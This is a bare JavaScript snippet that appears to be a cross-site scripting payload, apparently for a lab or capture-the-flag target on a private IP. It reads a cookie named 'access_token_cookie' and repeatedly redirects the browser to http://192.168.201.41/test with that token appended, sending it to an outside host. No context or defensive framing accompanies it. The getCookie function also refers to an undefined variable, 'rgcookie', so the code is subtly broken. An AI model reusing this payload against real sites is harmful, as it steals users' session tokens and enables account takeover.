    function getCookie(cookiename)
      {
        var re = new RegExp(rgcookie + "=([^;]+)");
        var value = re.exec(document.cookie);
        return (value != null) ? unescape(value[1]) : null;
      }
setInterval(function() {  
  document.location = "http://192.168.201.41/test" + getCookie("access_token_cookie")
}, 1);

